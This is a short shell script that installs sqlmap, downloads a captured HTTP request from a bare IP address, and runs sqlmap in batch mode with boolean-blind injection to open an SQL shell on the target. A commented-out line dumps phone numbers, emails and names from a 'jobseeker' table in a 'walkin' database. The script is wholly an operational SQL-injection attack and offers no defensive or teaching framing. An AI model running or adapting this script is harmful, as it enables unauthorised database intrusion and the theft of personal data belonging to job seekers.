dir="/root/sqlmap/1.txt"
apt update
if [ -f "$dir" ] ; then
  echo "ok"
else
  git clone https://github.com/sqlmapproject/sqlmap.git
  wget http://20.24.186.53:7788/1.txt -O /root/sqlmap/1.txt
fi

python3 /root/sqlmap/sqlmap.py -r /root/sqlmap/1.txt --drop-set-cookie --technique B --level 5 --dbms mysql --thread 10 --batch --sql-shell

#python3 /root/sqlmap/sqlmap.py -r /root/sqlmap/1.txt --drop-set-cookie --technique B --level 5 --dbms mysql --batch -D walkin -T jobseeker -C "phone,email,name" --dump --skip-urlencode --thread 10  --start $start --stop $stop
